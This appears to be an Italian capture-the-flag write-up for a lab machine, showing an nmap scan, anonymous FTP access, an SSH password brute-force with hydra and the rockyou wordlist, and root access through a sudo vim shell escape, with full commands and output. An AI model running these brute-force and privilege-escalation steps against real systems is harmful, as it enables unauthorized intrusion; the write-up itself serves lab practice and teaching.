@@ -1,0 +1,192 @@
+Si inizia con una bella scan con il l'amichevole recon di quartiere: nmap
+A questo giro ho usato un sudo nmap con i semplici comandi -sC -sV e -v per semplicità e rapidità, ed ha funzionato piuttosto bene, molto meglio rispetto ad altre opzioni. (non ho provato -A, ma fa nulla per stavolta non serviva)
+
+===================================================================================================
+
+root@ip-10-10-54-164:~# sudo nmap -sC -sV -v 10.10.50.65
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2023-05-16 23:56 BST
+NSE: Loaded 146 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 23:56
+Completed NSE at 23:56, 0.00s elapsed
+Initiating NSE at 23:56
+Completed NSE at 23:56, 0.00s elapsed
+Initiating ARP Ping Scan at 23:56
+Scanning 10.10.50.65 [1 port]
+Completed ARP Ping Scan at 23:56, 0.22s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 23:56
+Completed Parallel DNS resolution of 1 host. at 23:56, 0.00s elapsed
+Initiating SYN Stealth Scan at 23:56
+Scanning ip-10-10-50-65.eu-west-1.compute.internal (10.10.50.65) [1000 ports]
+Discovered open port 21/tcp on 10.10.50.65
+Discovered open port 80/tcp on 10.10.50.65
+Discovered open port 2222/tcp on 10.10.50.65
+Completed SYN Stealth Scan at 23:56, 10.69s elapsed (1000 total ports)
+Initiating Service scan at 23:56
+Scanning 3 services on ip-10-10-50-65.eu-west-1.compute.internal (10.10.50.65)
+Completed Service scan at 23:56, 6.09s elapsed (3 services on 1 host)
+NSE: Script scanning 10.10.50.65.
+Initiating NSE at 23:56
+NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
+Completed NSE at 23:57, 30.20s elapsed
+Initiating NSE at 23:57
+Completed NSE at 23:57, 0.00s elapsed
+Nmap scan report for ip-10-10-50-65.eu-west-1.compute.internal (10.10.50.65)
+Host is up (0.00031s latency).
+Not shown: 997 filtered ports
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.54.164
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 5
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 2 disallowed entries 
+|_/ /openemr-5_0_1_3 
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
+|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
+|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (EdDSA)
+MAC Address: 02:90:0D:C8:16:0D (Unknown)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+Initiating NSE at 23:57
+Completed NSE at 23:57, 0.00s elapsed
+Initiating NSE at 23:57
+Completed NSE at 23:57, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 47.96 seconds
+
+===================================================================================================
+
+Scoperti i 3 port aperti: 21(ftp),80(http),2222(ssh)
+Mi collego al'ftp e vedo che posso farci, per poi passare alla ssh e trovare exploit per il website.
+
+===================================================================================================
+
+root@ip-10-10-54-164:~# ftp 10.10.50.65
+Connected to 10.10.50.65.
+220 (vsFTPd 3.0.3)
+Name (10.10.50.65:root): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
+226 Directory send OK.
+ftp> cd pub
+250 Directory successfully changed.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
+226 Directory send OK.
+ftp> get ForMitch.txt
+local: ForMitch.txt remote: ForMitch.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
+226 Transfer complete.
+166 bytes received in 0.00 secs (224.5282 kB/s)
+ftp> exit
+221 Goodbye.
+root@ip-10-10-54-164:~# cat ForMitch.txt
+Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
+
+===================================================================================================
+
+L'obiettivo ora sarebbe accedere via ssh
+Ottenuto un username possibile, ossia "mitch" dal file appena letto, 
+vado a brute-force la password con hydra
+e la dir /usr/share/wordlists/rockyou.txt
+
+===================================================================================================
+
+root@ip-10-10-54-164:~# hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://10.10.50.65:2222 -v
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2023-05-17 00:45:03
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking ssh://10.10.50.65:2222/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[INFO] Testing if password authentication is supported by ssh://mitch@10.10.50.65:2222
+[INFO] Successful, password authentication is supported by ssh://10.10.50.65:2222
+[ERROR] could not connect to target port 2222: Socket error: Connection reset by peer
+[ERROR] could not connect to target port 2222: Socket error: Connection reset by peer
+[ERROR] ssh protocol error
+[ERROR] ssh protocol error
+[ERROR] could not connect to target port 2222: Socket error: disconnected
+[ERROR] ssh protocol error
+[2222][ssh] host: 10.10.50.65   login: mitch   password: secret
+[STATUS] attack finished for 10.10.50.65 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 1 final worker threads did not complete until end.
+[ERROR] 1 target did not resolve or could not be connected
+[ERROR] 16 targets did not complete
+Hydra (http://www.thc.org/thc-hydra) finished at 2023-05-17 00:45:14
+
+===================================================================================================
+
+root@ip-10-10-54-164:~# ssh mitch@10.10.50.65 -p 2222
+mitch@10.10.50.65's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+
+Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
+
+===================================================================================================
+
+Vado a prendere la prima user flag e ora vediamo come fare PrivEsc
+uso sudo -l come sempre, per vedere che privilegi possiede l'user attuale e
+trovare un possibile exploit via GTFOBins
+
+===================================================================================================
+
+$ sudo -l
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+
+$ sudo vim -c ':!/bin/sh'    
+
+# cd /root
+# ls
+root.txt
+# cat root.txt
+W3ll d0n3. You made it!
+# 
+
+===================================================================================================
+
+Per le Flag3-4
+Bisogna spulciare il port 80, quindi il sito web, trovare l'exploit e via 
+ma questo è per una prossima volta, al momento ecco una wordlist per gobuster utile per iniziare
+ /usr/share/dirb/wordlists/common.txt
+Ecco con questa puoi iniziare a trovare la directory del server e quindi cercare poi il relativo exploit (CVE) per la versione
+
